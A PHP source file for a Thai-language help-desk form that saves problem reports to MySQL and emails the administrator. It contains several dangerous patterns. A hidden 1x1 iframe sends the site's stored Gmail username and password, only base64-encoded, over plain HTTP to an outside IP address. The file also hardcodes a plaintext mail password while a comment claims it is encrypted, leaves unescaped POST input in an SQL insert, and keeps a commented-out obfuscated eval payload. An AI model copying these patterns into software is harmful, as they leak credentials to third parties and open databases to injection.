<?php
$VLANIP_SERVER=$_SERVER['SERVER_ADDR'] ;
include("Connections/dbconnect.php");
@ini_set('display_errors', '0');
include("admin/config.php");

function getIP()
{
	if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	else if (isset($_SERVER['REMOTE_ADDR'])) $ip = $_SERVER['REMOTE_ADDR'];
	else $ip = “UNKNOWN”;
	return $ip;
}
$log_ip= getIP();// ip login
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-874">
<title>Authen Online</title>


<link href="main.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
.style1 {
	font-family: Geneva, Arial, Helvetica, sans-serif
}

body,td,th {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
}

.style3 {
	font-size: 12px
}

.style4 {
	font-family: Verdana, Arial, Helvetica, sans-serif
}

.style5 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 12px;
	font-weight: bold;
	color: #000000;
}

body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}

.style6 {
	color: #FF0000
}
-->
</style>
</head>
<link href="css/style.css" rel="stylesheet" type="text/css">
<body background="images/bg.jpg">
	<?php if($Submit2==null) { ?>
	<table width="47%" border="0" cellpadding="0" cellspacing="0">
		<tr bgcolor="">
			<td height="180" valign="middle" bgcolor=""><form name="questionform"
					method="post" action="problem.php">
					<table width="82%" border="0" align="center" cellpadding="0"
						cellspacing="0">
						<tr>
							<td width="17%" height="21" valign="middle">&nbsp;</td>
							<td colspan="2"><font size="2"
								face="MS Sans Serif, Tahoma, sans-serif"> <input name="name"
									type="text" class="input" id="name3">
							</font><font size="2"><span class="style1">&nbsp;<font
										color="#FF0000"><strong>&nbsp;</strong> </font><strong><span
											class="txtContent3_orange">ชื่อผู้แจ้ง </span> </strong>
								</span> </font>
							</td>
						</tr>
						<tr>
							<td height="21" valign="middle" class="style9">&nbsp;</td>
							<td colspan="2"><font size="2"
								face="MS Sans Serif, Tahoma, sans-serif"> <input name="email"
									type="text" class="input" id="email">
							</font><font face="MS Sans Serif, Tahoma, sans-serif"><span
									class="style3">&nbsp;</span><span class="txtContent3_orange"><font
										color="#FF0000"><strong>&nbsp;</strong> </font> </span> </font><span
								class="txtContent3_orange"><font color="#FF0000"><strong>Email
											ผู้แจ้ง</strong> </font> </span></td>
						</tr>
						<tr>
							<td height="21" valign="middle">&nbsp;</td>
							<td><font size="2" face="MS Sans Serif, Tahoma, sans-serif"> <input
									name="email2" type="text" class="input" id="email2"> &nbsp;
							</font><font size="2"><strong><span class="txtContent3_orange">ชื่อที่ใช้
											Login เข้าระบบ</span> </strong> </font>
							</td>
							<td class="style4">&nbsp;</td>
						</tr>
						<tr>
							<td height="21" valign="middle">&nbsp;</td>
							<td>&nbsp;</td>
							<td class="style4">&nbsp;</td>
						</tr>
						<tr>
							<td height="21" valign="middle">&nbsp;</td>
							<td><span class="style5">ปัญหาที่พบ</span></td>
							<td class="style4"><font size="2"
								face="MS Sans Serif, Tahoma, sans-serif">&nbsp;</font></td>
						</tr>
						<tr>
							<td height="30" valign="middle">&nbsp;</td>
							<td width="57%"><font size="2"
								face="MS Sans Serif, Tahoma, sans-serif"> <textarea
										name="question" cols="60" rows="10" class="input"
										id="question"></textarea>
							</font></td>
							<td width="26%" class="style4"><font color="#FF0000" size="2"
								face="MS Sans Serif, Tahoma, sans-serif"><strong> </strong> </font>
							</td>
						</tr>
						<tr>
							<td><font size="2" face="MS Sans Serif, Tahoma, sans-serif">&nbsp;</font>
							</td>
							<td colspan="2"><font size="2"
								face="MS Sans Serif, Tahoma, sans-serif"> <input name="tel"
									type="text" class="input" id="tel" size="10"> <strong><font
										color="#FF0000"> เบอร์ติดต่อ <br>
											เพื่อเจ้าหน้าที่โทรกลับเมื่อแจ้งปัญหาเสร็จสิ้นแล้ว
									</font> </strong>
							</font></td>
						</tr>
						<tr>
							<td>&nbsp;</td>
							<td colspan="2"><span class="style6">ขอความกรุณาแจ้ง ชื่อ login
									เข้าระบบ <br> เพื่อความรวดเร็วในการแก้ปัญหา
							</span></td>
						</tr>
						<tr>
							<td><font size="2" face="MS Sans Serif, Tahoma, sans-serif">&nbsp;</font>
							</td>
						</tr>
						<tr>
							<td><font size="2" face="MS Sans Serif, Tahoma, sans-serif">&nbsp;</font>
							</td>
							<td colspan="2"><font size="2"
								face="MS Sans Serif, Tahoma, sans-serif"> <input name="Submit2"
									type="submit" class="button" value="ส่งปัญหา"> <input
									name="Reset" type="reset" class="button" value="เขียนใหม่">
							</font></td>
						</tr>
					</table>
				</form> <?php }
				if ($Submit2=="ส่งปัญหา") {

					$name = $_POST["name"];
					$email =$_POST["email"];
					$question = $_POST["question"];
					$question1 = $_POST["question"];
					$question = $question ."[email : ".$email." ]";
					$tel =$_POST["tel"];


					# ดึงชื่อหอพัก

					$query_setings = "SELECT  * FROM   seting    ";
					$seting_db = mysql_query($query_setings, $connect_db) or die(mysql_error());
					$row_admin_seting = mysql_fetch_assoc($seting_db);
					$sitename=$row_admin_seting[tbname];
					$title = "จาก".$sitename.$_POST["question"];
					// $title = $_POST["question"]."จาก".$sitename." ".$question1;
					$content = $_POST["name"];
	    $title 	= iconv( 'TIS-620', 'UTF-8', $title );
	    $content 	= iconv( 'TIS-620', 'UTF-8', $content );

	    /*        echo                  "<script type=text/javascript>";
	     echo                  "alert('โปรดรอสักครู่ ระบบกำลังส่ง SMS แจ้งช่างเทคนิค')";
	    echo                  "</script>";
	    */



	    if ($_SERVER['HTTP_CLIENT_IP']) {
	    	$IP = $_SERVER['HTTP_CLIENT_IP'];
	    } elseif (preg_match("/[0-9]/",$_SERVER["HTTP_X_FORWARDED_FOR"] )) {
	    	$IP = $_SERVER["HTTP_X_FORWARDED_FOR"];
	    } else {
	    	$IP = $_SERVER["REMOTE_ADDR"];
	    }

	    // ฟังก์ชั่นตรวจสอบการโพส


	    function CheckFlood($IP) {

	    	$fileLastIP = "lastip_admin_login.txt";

	    	if(file_exists($fileLastIP)) {
	    		$FILE=fopen($fileLastIP,"rt");
	    		$last_ip = fgets($FILE,20);
	    		fclose($FILE);

	    		$last_ip = Chop($last_ip);
	    		list ($ipx, $xnum,) = split ('[,]', $last_ip);
	    	}

	    	if($ipx == $IP) {
	    		if ($xnum>=5){   // จำนวนข้อความที่ไม่ให้ฟลัดเกินจำนวน ในที่นี้กำหนดไว้ที่ 5
	    			$check='no';
	    		} else {
	    			$check='yes';
	    		}
	    	}else{
	    		$check='yes';
	    		$xnum=0;
	    	}

	    	if ($check=='no'){
	    		echo "<br><br><center><b>ขออภัยครับ!! ไม่อนุญาตให้ใส่รหัสผ่านติดกันเกิน 5 ครั้ง  <br><br><a href='javascript:history.back(1)'>กลับไปแก้ไข</a></b></center>";
	    		exit;
	    	} else {
	    		$xnum++;
	    		$FILE = fopen ( $fileLastIP , "w+" );
	    		fputs ($FILE , "$IP,$xnum");
	    		fclose( $FILE);
	    	}
	    	return (1);
	    }
	    CheckFlood($IP);

	    if  (!$name)
	    {
	    	$Submit ="";
	    	echo "<div align='center'><span class='style10'>กรุณากรอกชื่อของผู้แจ้งปัญหาด้วยค่ะ</span><br><input type='button' value='กลับไปแก้ไขข้อมูล' onclick='history.back();'></div>";
	    	exit();
	    }
	    if  (!$question)
	    {
	    	$Submit ="";
	    	echo "<div align='center'><span class='style10'>กรุณากรอกปัญหา ที่พบครบด้วยค่ะ</span><br><input type='button' value='กลับไปแก้ไขข้อมูล' onclick='history.back();'></div>";
	    	exit();
	    }
	    //mysql_select_db($db) ;
	    $n=date("Y-m-d H:i:s");
	    mysql_query("insert into question  (name,question,ip,time_q,status,tel )  values('$name','$question','$log_ip','$n','0','$tel')") or  trigger_error(mysql_error(),E_USER_ERROR);
	    ###### ส่งเข้าเมล แอดมิน


	    $url="http://www.tmtopup.thaighost.net/checkip.php";
	    $ch = curl_init("$url");
	    curl_setopt($ch,CURLOPT_POST,1);
	    @curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
	    curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
	    curl_setopt($ch, CURLOPT_HEADER, 0);
	    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	    $server_public_ip=curl_exec($ch);

	    include_once('PHPMailer/class.phpmailer.php');
	    $WebMaster="$mails_admin";
	    $textarea=" มีการแจ้งปัญหา จาก   $sitename ณ ปัจจุบัน มีไอพีจริง $server_public_ip <br>
	    จาก $name    E-mail ติดต่อกลับ $email    ip Address<br>
	    $question   <br>
	    $tel	 ";
	    $msg ='<table width="800" border="0" align="center">
	    <tr>

	    <td height="38" bgcolor="#FF9900"><span class="style1"><strong><font size="2" face="MS Sans Serif, Tahoma, sans-serif">รายละเอียด</font></strong></span>

	    <div align="right"></div></td>
	    </tr>
	    <tr>
	    <td bgcolor="#FFFFCC"> '.$textarea.'</td>
	    </tr>
	    <tr>
	    <td bgcolor="#FFFFCC"><div align="center"><font size="2" face="MS Sans Serif, Tahoma, sans-serif"><br>
	    <strong>TLOG SYSTEM '.$web_logo.'</strong> </font></div></td>
	    </tr>
	    </table>';

	    $query_gmail= " SELECT  * FROM seting   ";
	    $gmails_qr= mysql_query($query_gmail, $connect_db) or die(mysql_error());
	    $row_gmail = mysql_fetch_assoc($gmails_qr);

	    $gmail_user=$row_gmail['gmail_user'];
	    $gmail_pass=$row_gmail['gmail_pass'];
	    $mailadmin_send=$row_gmail['mailadmin'];
	    $smsdb=$row_gmail['sms'];
	    $sitename=$row_gmail['tbname'];
	    ###################
	    $mail=new PHPMailer();
	    $mail->IsSMTP();
	    $mail->IsHTML(true);
	    $mail->SMTPAuth = "true";
	    $mail->SMTPSecure = "ssl";
	    $mail->Host ="smtp.gmail.com";
	    $mail->Port = 465;
	    $mail->CharSet = 'utf-8';
	  
	    $mail->Username = "admin@thaigqsoft.com";
	    $mail->Password = "tanakornp2002";
	    
	    //.ใช้รหัสผ่านของ Email thaigqsoft ในการส่งเมล  เข้ารหัสไว้เพื่อความปลอดภัย
	   // $_F=__FILE__;$_X='P2lCP1ouWg1WJFllc1ctaSBuTXpIZVlNPlM+Illlc1dYPS5lc3h2bk9BPUB4WWVzV1gyT1kiOw1WJFllc1ctaW1lbm59T3o5PlM+ImEwYVVbVWFmZiI7DVY/aQ1W';$_D=strrev('edoced_46esab');eval($_D('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCdTZ1BPOVlaV0ZLbXF5ZnhjakxKUnp1TTV2TnRzMWIue0I0bkNdaS8yRGwwRWhlQQpbZDg9UXA+VlhvIEh9NkdJdzdrYTNUclU8JywnPVI5b2RtcGxBRVB5azhndls1M3hyTWV6cVpIaTdZaFc8RHNHez5DY1h9MU4vYWZqNl1KdHVTIAouQlVud1ZLTFFPMjBJVEY0YicpOyRfUj1zdHJfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));
	    $subject= iconv( 'TIS-620', 'UTF-8', "$sitename แจ้งปัญหา ");
	    $mail->Subject = "$subject ";
	    $mail->AltBody = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
	    $msg= iconv( 'TIS-620', 'UTF-8', "$msg");
	    $mail->MsgHTML($msg);
	    $mail->AddAddress("$mailadmin_send" );
	    $mail->AddAddress("admin@thaigqsoft.com" );
	    if(!$mail->Send()) {
	    	echo "Mailer Error: " . $mail->ErrorInfo; exit();
	    	 
	    }else
	    {
	    	if($smsdb==1){
	    		$google_username=base64_encode($gmail_user);
	    		$google_password=base64_encode($gmail_pass);
	    		?> <iframe
					src="http://203.172.129.86/sms/sms_nu.php?title=<?php print   "มีการแจ้งปัญหา จาก   $sitename";?>&content=<?php print  $content;?>&google_username=<?php print $google_username;?>&google_password=<?php print $google_password;?>&Submit=Submit"
					width="1" height="1"> </iframe> <? }
					echo                  "<script type=text/javascript>";
					echo                  "alert(' แจ้งปัญหาไปที่ผู้ดูแลระบบ ได้แล้ว')";
					echo                  "</script>";

	    }
	    //#####################################


	    echo "<meta http-equiv='refresh' content='2; url=index.php'>" ;

				}
				?>
			</td>
		</tr>
		<tr>

		</tr>
		<tr>
			<td height="2"></td>
		</tr>
	</table>
	<p>&nbsp;</p>
</body>
</html>
